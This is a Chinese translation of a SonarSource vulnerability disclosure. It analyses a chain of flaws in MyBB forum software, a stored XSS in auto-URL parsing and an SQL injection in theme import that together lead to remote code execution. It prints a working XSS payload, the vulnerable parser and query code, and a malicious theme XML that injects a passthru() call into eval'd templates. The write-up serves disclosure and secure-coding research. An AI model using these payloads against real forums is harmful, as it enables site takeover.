> 原文链接: https://www.anquanke.com//post/id/235461 


# 漏洞分析：MyBB远程代码执行漏洞链分析


                                阅读量   
                                **183668**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者sonarsource，文章来源：blog.sonarsource.com
                                <br>原文地址：[https://blog.sonarsource.com/mybb-remote-code-execution-chain](https://blog.sonarsource.com/mybb-remote-code-execution-chain)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01fb6fc6f90c7d91de.png)](https://p5.ssl.qhimg.com/t01fb6fc6f90c7d91de.png)



## 写在前面的话

在这篇文章中，我们将跟大家分享我们在知名论坛软件MyBB中发现的几个安全漏洞。跟所有的网络安全爱好者一样，我们喜欢通过浏览各种应用程序来增长知识，并参加一些比赛，比如CTF夺旗赛等等。近期，我们决定研究论坛软件来创建一个CTF挑战，并在MyBB中发现了一系列严重的漏洞。



## 关于MyBB

MyBB是国际上非常优秀的免费论坛软件，最大的特色是简单但是功能却出奇的强大。支持多国语言，可以分别设置前台后台的语言，每个用户也可以设置自己使用何种语言访问论坛包括自己的时区等，自定义功能强大到没有做不到只有想不到。

MyBB是一个基于PHP+MySQL搭建，功能强大，高效的开源论坛系统。MyBB 在设计时集成了很多经过深思熟虑的用户习惯，这让 MyBB 变得更加简单易用。 MyBB 使用了标准的论坛结构和模式，所以你的用户可在你的论坛获得良好的用户体验。用户可以通过用户控制面板改变他们自己的习惯，当然他们还可以轻松的标记和收 藏他们认为重要的帖子。论坛的管理员和版主也可以获得相应的权限来维持论坛的整洁。

MyBB 强大的管理后台可以让你轻松定制论坛的每一个细节。通过 MyBB ，你可以轻松地改变论坛版块的属性，布局，结构等。比如说，你想让你的用户在XXX秒钟内最多只发一个帖子；再比如，你想让用户的签名显示在他们的帖子下方。你也可以很容易的在这里 MyCode 获取自定义代码添加到你的论坛上，这就和你在论坛上发表帖子一样方便。



## 漏洞影响

我们通过研究发现，版本号介于1.8.16和1.8.25之间的MyBB论坛软件将受到这两个严重安全漏洞的影响，我们可以通过将这两个漏洞串联起来组合成漏洞利用链来实现远程代码执行，而无需在默认MyBB配置上访问特权帐户。我们报告的第一个漏洞（自动嵌套URL持久化XSS漏洞：CVE-2021-27889）是MyBB软件中的一个问题，它将允许任何未授权的论坛用户都能够将存储型XSS Payload注入至MyBB运行线程、帖子和私人消息中。

我们报告的第二个漏洞（主题属性SQL注入漏洞：CVE-2021-27890）是一个SQL注入漏洞，它将导致远程代码执行，并且可能由在MyBB论坛管理员仪表板中具有活动会话的任何用户触发。

高级攻击者可以针对存储型XSS漏洞开发漏洞利用技术，然后向MyBB的目标管理员发送私人消息。管理员一旦在论坛软件中打开这条私人消息，漏洞就会被触发。随后，远程代码执行漏洞将会在论坛后台被自动利用，并导致目标MyBB论坛被攻击者完全接管。



## 技术细节

### <a class="reference-link" name="%E8%87%AA%E5%8A%A8%E5%B5%8C%E5%A5%97URL%E4%B8%AD%E7%9A%84%E6%8C%81%E4%B9%85%E5%8C%96XSS%EF%BC%88CVE-2021-27889%EF%BC%89"></a>自动嵌套URL中的持久化XSS（CVE-2021-27889）

像MyBB这样的现代论坛软件通常允许非特权用户创建包含图像、视频、标题、列表等的帖子或私人消息。

这项功能必须小心地实现，因为如果这项功能的限制不够严格，不受信任的用户可能会滥用它以安全的方式修改论坛的内容。最坏的情况是，用户可以将任意JavaScript代码注入到可信论坛提供的HTML文档中。

根据我们的经验，我们观察到两种实现此功能的方法：

1、允许用户提交HTML标记，并采用了一个允许/阻止列表来判断输入是否正常并将其安全地显示给用户。

2、使用现有的或自定义的消息格式，例如Markdown，并根据输入创建合理的HTML输出。

这两种方法各有优缺点，MyBB在呈现过程中使用了第二种方法，并且是一种自定义代码实现。

下面的例子将说明其自定义代码的转换机制：

```
[url]https://blog.sonarsource.com[/url]
 = &lt;a href="https://blog.sonarsource.com"&gt;https://blog.sonarsource.com&lt;/a&gt;
[b]Hello, World![/b] 
 = &lt;strong&gt;Hello, World!&lt;/strong&gt;
```

例如，每当用户创建包含此类代码的私有消息时，MyBB解析器就会对整个输入进行编码，然后利用正则表达式查找所有的输入并用它们各自的HTML代码替换它们。

当用于查找和替换的正则表达式模式过于宽松时，这类解析器中可能会出现问题，这可能导致呈现嵌套的HTML标记。

MyBB呈现过程的另一个不太明确的步骤是自动检测没有用[URL]包裹的URL，并将它们转换为HTML链接。

下面的代码段显示了$message变量是如何传递给renderer类的mycode_auto_url()的：

**mybb/inc/class_parser.php**

```
525         if($mybb-&gt;settings['allowautourl'] == 1)
 526         `{`
 527             $message = $this-&gt;mycode_auto_url($message);
 528         `}`
 529 
 530         return $message;
```

第527行的$message变量包含已呈现的HTML结果，其中内容由用户提供的信息构成，因此需要进行小心处理以保证不会出现HTML标签或属性崩溃的情况。这样做的条件是，只有不属于HTML标记的URL才允许转换为&lt;a&gt;标记。

但是，MyBB使用了下列正则表达式来尝试进行安全解析：

**mybb/inc/class_parser.php**

```
1618   $message = preg_replace_callback(
         "#&lt;a\\s[^&gt;]*&gt;.*?&lt;/a&gt;|([\s\(\)\[\&gt;])(www|ftp)\.([\w|\d\-./]+)#ius", 
          array($this, 'mycode_auto_url_callback'), 
          $message);
```

比如说，当[img]转换成HTML时的结果如下：

```
[img]http://xyzsomething.com/image.png[/img]
 = &lt;img src="http://xyzsomething.com/image.png" /&gt;
```

当构造这样一个图像标记时，将要形成src属性的URL将被去除所有空白，并且是HTML和URL编码的。这些转换将删除所有字符，可以匹配的第二个替代regex是用于自动URL编码。因此，第二部分将假设第一次转换已经过滤了URL。

但是，URL编码和HTML编码都不会修改括号()，因此我们可以通过构建一个[img]来使上述的第二个正则表达式失效：

```
[img]http://xyzsomething.com/image?)http://x.com/onerror=alert(1);//[/img]
```

首先，下列&lt;img&gt;标签将会被创建：

```
&lt;img src="http://xyzsomething.com/image?)http://x.com/onerror=alert(1);//"&gt;
```

接下来，mycode_auto_url()方法会匹配第二个URL，最终的HTML结果如下：

```
&lt;img src="http://xyzsomething.com/image?)&lt;a href=" http:="" x.com="" 
 onerror="alert(1);//&amp;quot;" target="_blank" rel="noopener" class="mycode_url"&gt;
```

如你所见，&lt;a&gt;标记已插入到现有的&lt;img&gt;标记中。因为这两个标记都包含双引号，所以它们会互相破坏数据结构。Chrome或FireFox等浏览器将构造一个包含攻击者控制的onerror事件处理程序的最终&lt;img&gt;元素，这使得攻击者能够在读取恶意帖子或私人消息的目标用户浏览器中执行任意JavaScript代码。



## 主题属性中的SQL注入将导致远程代码执行

上一节中描述的XSS漏洞使攻击者能够以MyBB论坛的管理员作为攻击目标。如果攻击者成功地将恶意JavaScript代码注入到具有活动会话的管理用户的浏览器中，攻击者将可以使用管理员权限执行任意操作。MyBB会主动防止管理员用户在底层服务器上执行任意PHP代码，因此我们将提供一个可通过管理权限访问的已验证RCE漏洞。

MyBB管理员可以访问的功能之一是MyBB论坛的主题管理器，MyBB主题由键值对列表组成，键是当前页面的一个组件，例如应该显示的欢迎返回消息：

```
eval('$modcplink = "'.$templates-&gt;get('header_welcomeblock_member_moderator').'";');
```

上述例子中，请求了主题键header_welcomeblock_member_moderator，这个主题组件的值如下:

```
&lt;div id='welcomeblock_back'&gt;&lt;b&gt;`{`$mybb-&gt;user['username']`}`&lt;/b&gt;&lt;/div&gt;
```

这也就意味着，最终传递给eval()的字符串如下：

```
$modcplink = "&lt;div id='welcomeblock_back'&gt;&lt;b&gt;`{`$mybb-&gt;user['username']`}`&lt;/b&gt;&lt;/div&gt;";
```

大家可以看到，内容已经用双括号括起来了，并将PHP变量`{`$mybb-&gt;user[‘username’]`}`插入到了字符串中。此功能不能立即启用远程代码执行（RCE）的原因是，当模板值存储到数据库中时，MyBB会在模板值中转义双引号。因此，不可能跳出双引号字符串。不过，我们可以通过攻击者可能修改模板并向变量中添加$使其成为字符串插值，如下所示：

```
$modcplink = "&lt;div id='welcomeblock_back'&gt;&lt;b&gt;$`{`arbitrary_function()`}`&lt;/b&gt;&lt;/div&gt;";
```

但是，MyBB还会通过阻止管理员插入这种插值来防止这种独特的PHP怪癖。这意味着如果我们可以找到MyBB过滤器的绕过方式，那么我们就仍然可以执行任意PHP代码。接下来，我们将利用SQL注入漏洞来绕过MyBB过滤器。

我们可以将包含了主题属性的XML文件引入进MyBB主题之中，比如说：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="Theme Example" version="1405"&gt;
   &lt;properties&gt;
      &lt;templateset&gt;&lt;![CDATA[10]]&gt;&lt;/templateset&gt;
      &lt;imgdir&gt;&lt;![CDATA[images/]]&gt;&lt;/imgdir&gt;
      &lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
   &lt;/properties&gt;
   &lt;stylesheets&gt;&lt;/stylesheets&gt;
   &lt;templates&gt;
      &lt;template name="header_welcomeblock_member_moderator" version="1404"&gt;&lt;![CDATA[
         &lt;div id='welcomeblock_back'&gt;&lt;b&gt;`{`$mybb-&gt;user['username']`}`&lt;/b&gt;&lt;/div&gt;
      ]]&gt;&lt;/template&gt;
   &lt;/templates&gt;
&lt;/theme&gt;
```

每当管理员导入这样的主题时，都会对XML进行解析，并将主题的属性存储到数据库中。事实证明，templateset属性很容易受到SQL注入的影响。当上传这些主题时，它们被插入MyBB实例的数据库中，然后在其他SQL查询中使用，而不进行任何过滤。

### <a class="reference-link" name="SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B%EF%BC%9A"></a>SQL注入漏洞相关代码如下：

```
$query = $db-&gt;simple_select("templates", "title,template",
    "title IN (''$sql) AND sid IN ('-2','-1','".$theme['templateset']."')",
    array('order_by' =&gt; 'sid', 'order_dir' =&gt; 'asc')
```

如上所示，通过使用恶意主题，我们将能够控制相关属性，并让此缓存函数返回攻击者控制的值。以下是一个使用SQL注入Payload构建的主题的示例：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="Default" version="1821"&gt;
   &lt;properties&gt;
      &lt;templateset&gt;') AND 1=0 UNION SELECT title, '$`{`passthru(\'ls\')`}`' from mybb_templates -- &lt;/templateset&gt;
   &lt;/properties&gt;
&lt;/theme&gt;
```

导致的SQL查询语句将如下所示：

```
SELECT title, template FROM mybb_templates WHERE 
   title IN (‘header_welcomeblock_member_moderator’, ‘...’) AND SID IN (‘-2’, ‘-1’, ‘’) 
   AND 1=0 UNION SELECT title, '$`{`passthru(\'ls\')`}`' from mybb_templates -- ’)
```



## 总结

像WordPress和Magento曾经都出现过类似的安全问题，因此我们建议不要在解析器中过多地使用正则表达式，因为这会增加数据处理的复杂程度，而且这往往还会得不偿失。
